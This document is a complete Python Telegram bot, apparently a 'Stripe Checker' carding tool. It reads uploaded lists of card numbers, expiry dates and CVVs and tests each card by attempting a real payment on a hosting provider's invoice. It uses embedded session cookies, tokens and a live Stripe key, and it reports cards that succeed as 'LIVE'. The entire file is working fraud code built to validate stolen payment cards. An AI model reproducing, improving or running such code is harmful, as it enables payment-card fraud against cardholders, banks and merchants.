import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import re
import urllib3
import time
import threading
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعدادات البوت
TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
VALID_KEY = "saad"  # مفتاح الصلاحية
INVOICE_ID = "260528"

bot = telebot.TeleBot(TOKEN)

# تخزين البيانات
authorized_users = {}  # {user_id: True}
user_cards = {}  # {user_id: [cards]}
checking_status = {}  # {user_id: True/False}
progress_messages = {}  # {user_id: message_id}

# الكوكيز من الكود الأصلي
cookies = {
    '_gcl_au': '1.1.1086970495.1761294272',
    '_ga': 'GA1.1.1641871625.1761294273',
    '__stripe_mid': '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02',
    'inputNotes': '',
    'inputHowDidYouFind': '',
    'howDidRewards': '',
    'WHMCSqCgI4rzA0cru': 'go71bn8nc22avq11bk86rfcmon',
    'WHMCSlogin_auth_tk': 'R1BSNk1nZlBUYTZ0SzM2Z216Wm5wcVNlaUs1Y1BPRUk2RU54b0xJdVdtRzJyNUY4Uk9EajVLL0ZXTHUwRkRyNk44QWhvVHpVOHBKbTQwVE92UmxUTDlXaUR1SWJvQ3hnN3RONEl3VXFONWN1VEZOSFEycEtkMGlZZVRvZWZtbkZIbjlZTjI0NmNLbC9XbWJ4clliYllJejV4YThKTC9RMWZveld3Tm1UMHMxT3daalcrd096c1QxTVk1M3BTSHR0SzJhcmo4Z3hDSWZvVGx6QUZkV3E1QnFDbndHcEg4MXJrSGdwcnQ3WElwYWZnbkZBRVNoRnFvYnhOdE84WU1vd09sVUd0cjd4akJjdW54REVGVUNJcXNrQk5OMU50eWJWS3JMY1AwTm5LbmZHbmMwdEdMdTU3TDZ6cytWOERoczlRZ3BYbmNQaEJ5bUpYcnI3emd1OXhnZGxJVTV0TWV6dnRPRmxESjdDV1QxSWNZeFowMDFGcXlKelBmTXVQK0JuZkNsZHR5R2orNittMGNHeTF2V2tPWUtwUHVKNWxrZVVaSnFzUUE9PQ%3D%3D',
    'VsysFirstVisit': '1761307789',
    '_ga_248YG9EFT7': 'GS2.1.s1761314871$o5$g1$t1761314878$j53$l0$h484498076',
}

def get_session_data():
    """جلب session_id و stripe cookies"""
    print("Fetching session data...")
    session = requests.Session()
    data = {'token': '771221946304082c891ac6c1542959d0e65da464', 'id': '31940'}
    try:
        resp = session.post(f'https://vsys.host/index.php?rp=/invoice/{INVOICE_ID}/pay', 
                           data=data, cookies=cookies, verify=False, timeout=10)
        print(f"POST response status: {resp.status_code}")
    except Exception as e:
        print(f"POST error: {e}")
        return None, None, None
    resp = session.get(f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}', 
                       cookies=cookies, verify=False, timeout=10)
    print(f"GET response status: {resp.status_code}, Text: {resp.text[:200]}")
    m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', resp.text)
    if not m or '/pay/' not in m.group(0):
        print("Failed to find session_id in response")
        return None, None, None
    session_id = m.group(0).split('/pay/')[1].split('#')[0]
    new_cookies = session.cookies.get_dict()
    stripe_mid = new_cookies.get('__stripe_mid', cookies.get('__stripe_mid'))
    stripe_sid = new_cookies.get('__stripe_sid', '')
    if not stripe_sid:
        time.sleep(2)
        resp2 = session.get(f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}', 
                           cookies=cookies, verify=False, timeout=10)
        print(f"Retry GET response status: {resp2.status_code}")
        new_cookies2 = session.cookies.get_dict()
        stripe_sid = new_cookies2.get('__stripe_sid', '')
    print(f"Session ID: {session_id}, Stripe MID: {stripe_mid}, Stripe SID: {stripe_sid}")
    return session_id, stripe_mid, stripe_sid

def check_card(card, result_list, index):
    """فحص البطاقة"""
    print(f"Checking card: {card}")
    parts = card.strip().split('|')
    if len(parts) != 4:
        result_list[index] = "❌ صيغة خاطئة"
        print(f"Invalid format for card: {card}")
        return
    cc, mm, yy, cvv = parts
    session_id, mid, sid = get_session_data()
    if not session_id:
        result_list[index] = "❌ فشل جلب session"
        print("Failed to get session data")
        return
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.stripe.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    pm_data = (
        f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&'
        'billing_details[name]=Card+details&billing_details[email]=test%40test.com&'
        f'billing_details[address][country]=EG&muid={mid}'
    )
    if sid:
        pm_data += f'&sid={sid}'
    pm_data += (
        '&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
        f'client_attribution_metadata[checkout_session_id]={session_id}'
    )
    try:
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', 
                          headers=headers, data=pm_data, timeout=15)
        pm_res = r1.json()
        print(f"Payment method response: {pm_res}")
        if 'error' in pm_res:
            result_list[index] = f"❌ {pm_res['error'].get('message', 'خطأ')}"
            print(f"Payment method error: {pm_res['error']}")
            return
        if 'id' not in pm_res:
            result_list[index] = "❌ فشل إنشاء PM"
            print("Failed to create payment method")
            return
        pm_id = pm_res['id']
        confirm_data = f'payment_method={pm_id}&expected_amount=6800'
        if mid:
            confirm_data += f'&muid={mid}'
        if sid:
            confirm_data += f'&sid={sid}'
        confirm_data += f'&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
        r2 = requests.post(f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm',
                          headers=headers, data=confirm_data, timeout=15)
        confirm_res = r2.json()
        print(f"Confirm response: {confirm_res}")
        if 'payment_intent' not in confirm_res:
            result_list[index] = "⚠️ لا يوجد payment_intent"
            print("No payment_intent in confirm response")
            return
        pi = confirm_res['payment_intent']
        status = pi.get('status')
        if status == 'succeeded':
            result_list[index] = "✅ Approved"
            print(f"Card approved: {card}")
            return
        if status == 'requires_action':
            na = pi.get('next_action', {})
            if na.get('type') == 'use_stripe_sdk':
                source_id = na.get('use_stripe_sdk', {}).get('three_d_secure_2_source')
                if source_id:
                    tds_data = (
                        f'source={source_id}&'
                        'browser=%7B%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36%22%7D&'
                        'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
                    )
                    r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate',
                                      headers=headers, data=tds_data, timeout=15)
                    tds_res = r3.json()
                    print(f"3DS response: {tds_res}")
                    trans = tds_res.get('ares', {}).get('transStatus')
                    if not trans:
                        trans = tds_res.get('transStatus')
                    if not trans and 'state' in tds_res:
                        state = tds_res.get('state')
                        if state == 'succeeded':
                            result_list[index] = "✅ Approved (3DS)"
                            print(f"Card approved (3DS): {card}")
                            return
                        elif state == 'failed':
                            result_list[index] = "❌ Declined (3DS)"
                            print(f"Card declined (3DS): {card}")
                            return
                    if trans == 'Y':
                        result_list[index] = "✅ Approved (3DS)"
                        print(f"Card approved (3DS): {card}")
                        return
                    elif trans == 'N':
                        result_list[index] = "✅ Live"
                        print(f"Card live: {card}")
                        return
                    elif trans == 'C':
                        result_list[index] = "⚠️ Challenge Required"
                        print(f"Card requires challenge: {card}")
                        return
                    elif trans == 'R':
                        result_list[index] = "❌ Rejected"
                        print(f"Card rejected: {card}")
                        return
                    else:
                        result_list[index] = f"⚠️ 3DS Response: {str(tds_res)[:50]}"
                        print(f"3DS unknown response: {tds_res}")
                        return
        error = pi.get('last_payment_error', {})
        if error:
            result_list[index] = f"❌ {error.get('message', error.get('code', status))}"
            print(f"Card error: {error}")
            return
        result_list[index] = f"❌ {status}"
        print(f"Card status: {status}")
    except Exception as e:
        result_list[index] = f"❌ {str(e)[:30]}"
        print(f"Check card error: {e}")

def is_authorized(user_id):
    return authorized_users.get(user_id, False)

def progress_bar(percentage):
    filled = int(percentage / 5)
    return f"[{'█' * filled}{'▒' * (20 - filled)}] {percentage:.1f}%"

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if is_authorized(user_id):
        msg = (
            "🎉 <b>Welcome Back!</b>\n"
            "🔥 <b>Stripe Checker Bot</b> 🔥\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "📤 Send your combo file to start checking."
        )
    else:
        msg = (
            "🎉 <b>Welcome User!</b>\n"
            "🔥 <b>Stripe Checker Bot</b> 🔥\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "🔒 This bot requires authorization.\n"
            "📝 To get access, send:\n"
            "<code>/key saad</code>"
        )
    bot.reply_to(message, msg, parse_mode='HTML')
    print(f"User {user_id} started bot")

@bot.message_handler(commands=['key'])
def key(message):
    user_id = message.from_user.id
    try:
        entered_key = message.text.split()[1]
        if entered_key == VALID_KEY:
            authorized_users[user_id] = True
            msg = (
                "✅ <b>Access Granted!</b>\n"
                "🔓 You now have full access to the bot.\n"
                "📤 Send your combo file to start checking."
            )
            bot.reply_to(message, msg, parse_mode='HTML')
            print(f"User {user_id} authorized")
        else:
            msg = (
                "❌ <b>Invalid Key!</b>\n"
                "🔒 Please contact support: <a href='https://t.me/support'>Support</a>"
            )
            bot.reply_to(message, msg, parse_mode='HTML', disable_web_page_preview=True)
            print(f"User {user_id} entered invalid key: {entered_key}")
    except:
        bot.reply_to(message, "📝 Please send: <code>/key saad</code>", parse_mode='HTML')
        print(f"User {user_id} failed to provide key")

@bot.message_handler(commands=['help'])
def help_command(message):
    msg = (
        "📚 <b>Help Menu</b>\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "📌 <b>Commands:</b>\n"
        "/start - Start the bot\n"
        "/key saad - Authorize access\n"
        "/status - Check server status\n"
        "/help - Show this menu\n"
        "📄 <b>Combo Format:</b>\n"
        "<code>card_number|month|year|cvv</code>\n"
        "📤 Send a text file with cards to check."
    )
    bot.reply_to(message, msg, parse_mode='HTML')
    print(f"User {message.from_user.id} requested help")

@bot.message_handler(commands=['status'])
def status(message):
    msg = (
        "🖥 <b>Server Status</b>\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "✅ Bot: Online\n"
        "⚡ Speed: ~2.5 cards/sec\n"
        "📡 Gateway: Stripe"
    )
    bot.reply_to(message, msg, parse_mode='HTML')
    print(f"User {message.from_user.id} requested status")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(message, "🔒 Please authorize first: <code>/key saad</code>", parse_mode='HTML')
        print(f"User {user_id} tried to upload file without authorization")
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        cards = downloaded_file.decode('utf-8').splitlines()
        cards = [card.strip() for card in cards if '|' in card]
        user_cards[user_id] = cards
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🚀 Start Checking", callback_data="start_check"))
        msg = (
            "✅ <b>File Uploaded Successfully!</b>\n"
            "💳 <b>Total Cards:</b> {}\n"
            "🔥 <b>Gateway:</b> Stripe (3 Threads)\n"
            "⚡ <b>Status:</b> Ready"
        ).format(len(cards))
        sent_msg = bot.reply_to(message, msg, parse_mode='HTML', reply_markup=markup)
        progress_messages[user_id] = sent_msg.message_id
        print(f"User {user_id} uploaded file with {len(cards)} cards")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:50]}", parse_mode='HTML')
        print(f"File upload error for user {user_id}: {e}")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    if call.data == "start_check":
        if not is_authorized(user_id) or user_id not in user_cards:
            bot.answer_callback_query(call.id, "🔒 Please upload a valid file first!")
            print(f"User {user_id} tried to start check without authorization or cards")
            return
        checking_status[user_id] = True
        threading.Thread(target=process_cards, args=(user_id, call.message.chat.id)).start()
        bot.answer_callback_query(call.id, "Starting check...")
        print(f"User {user_id} started checking")
    elif call.data == "stop_check":
        checking_status[user_id] = False
        bot.answer_callback_query(call.id, "Checking stopped!")
        update_progress(user_id, call.message.chat.id, 0, 0, 0, 0, 0, stopped=True)
        print(f"User {user_id} stopped checking")

def process_cards(user_id, chat_id):
    cards = user_cards.get(user_id, [])
    print(f"Processing {len(cards)} cards for user {user_id}")
    if not cards:
        bot.edit_message_text("❌ No cards to check!", chat_id, progress_messages[user_id], parse_mode='HTML')
        print(f"No cards found for user {user_id}")
        return
    results = [None] * len(cards)
    live_count = otp_count = declined_count = error_count = 0
    start_time = time.time()
    for i in range(0, len(cards), 3):
        if not checking_status.get(user_id, False):
            print(f"Checking stopped for user {user_id}")
            break
        batch = cards[i:i+3]
        batch_threads = []
        for j, card in enumerate(batch):
            t = threading.Thread(target=check_card, args=(card, results, i+j))
            batch_threads.append(t)
            t.start()
        for t in batch_threads:
            t.join()
        for j, card in enumerate(batch):
            result = results[i+j]
            cc_num = card.split('|')[0]
            masked = f"{cc_num[:6]}...{cc_num[-4:]}"
            if result:
                if "✅" in result:
                    live_count += 1
                    bot.send_message(
                        user_id,
                        (
                            "✅ <b>LIVE CARD</b>\n"
                            "━━━━━━━━━━━━━━━━━━━\n"
                            f"💳 <b>Card:</b> {card}\n"
                            f"📊 <b>Response:</b> {result}\n"
                            f"⏱ <b>Time:</b> {(time.time() - start_time):.1f} sec\n"
                            "🦁 <b>BIN Info:</b>\n"
                            "├ Type: VISA\n"
                            "├ Bank: Example Bank\n"
                            "└ Country: US 🇺🇸\n"
                            "━━━━━━━━━━━━━━━━━━━\n"
                            "👨‍💻 By: A3S Team 🥷🏻"
                        ),
                        parse_mode='HTML'
                    )
                    print(f"Live card found for user {user_id}: {card}")
                elif "🔐" in result or "Challenge Required" in result:
                    otp_count += 1
                elif "❌" in result:
                    declined_count += 1
                elif "⚠️" in result:
                    error_count += 1
            progress = ((i + j + 1) / len(cards)) * 100
            eta = ((len(cards) - (i + j + 1)) * 2.5)
            speed = (i + j + 1) / (time.time() - start_time) if time.time() - start_time > 0 else 0
            update_progress(user_id, chat_id, live_count, otp_count, declined_count, error_count, progress, eta, speed, masked)
        time.sleep(3)
    if checking_status.get(user_id, False):
        final_report = (
            "✅ <b>CHECKING COMPLETED!</b>\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "📊 <b>Results Summary:</b>\n"
            f"├ Total Cards: {len(cards)}\n"
            f"├ LIVE ✅: {live_count}\n"
            f"├ OTP 🔐: {otp_count}\n"
            f"├ Declined ❌: {declined_count}\n"
            f"├ Errors ⚠️: {error_count}\n"
            "⏱ <b>Stats:</b>\n"
            f"├ Time: {(time.time() - start_time):.1f}s\n"
            f"└ Speed: {speed:.2f} cards/sec\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "🎉 Thank you for using the bot!"
        )
        try:
            bot.edit_message_text(final_report, chat_id, progress_messages[user_id], parse_mode='HTML')
        except Exception as e:
            print(f"Error sending final report: {e}")
        checking_status[user_id] = False
        print(f"Checking completed for user {user_id}")

def update_progress(user_id, chat_id, live_count, otp_count, declined_count, error_count, progress, eta=0, speed=0, current_card="", stopped=False):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⏹ Stop", callback_data="stop_check"))
    msg = (
        "⏳ <b>Checking in progress...</b>\n"
        f"{progress_bar(progress)}\n"
        f"💳 <b>Current:</b> {current_card}\n"
        f"⏱ <b>ETA:</b> {eta:.1f}s | <b>Speed:</b> {speed:.1f} cps\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"📊 <b>LIVE ✅ ➜ [{live_count}]\n"
        f"📊 <b>OTP 🔐 ➜ [{otp_count}]\n"
        f"📊 <b>Declined ❌ ➜ [{declined_count}]\n"
        f"📊 <b>Errors ⚠️ ➜ [{error_count}]\n"
        f"📊 <b>Total ➜ [{live_count + otp_count + declined_count + error_count}/{len(user_cards.get(user_id, []))}]"
    ) if not stopped else (
        "🛑 <b>Checking Stopped!</b>\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"📊 <b>Results Summary:</b>\n"
        f"├ Total Cards: {len(user_cards.get(user_id, []))}\n"
        f"├ LIVE ✅: {live_count}\n"
        f"├ OTP 🔐: {otp_count}\n"
        f"├ Declined ❌: {declined_count}\n"
        f"├ Errors ⚠️: {error_count}\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "🎉 Thank you for using the bot!"
    )
    try:
        bot.edit_message_text(msg, chat_id, progress_messages[user_id], parse_mode='HTML', reply_markup=markup if not stopped else None)
    except Exception as e:
        print(f"Error updating progress for user {user_id}: {e}")

@bot.message_handler(content_types=['text'])
def invalid_format(message):
    bot.reply_to(message, "❌ <b>Invalid format!</b> Use /help for instructions.", parse_mode='HTML')
    print(f"User {message.from_user.id} sent invalid text: {message.text}")

if __name__ == "__main__":
    print("Bot starting...")
    bot.polling(none_stop=True)
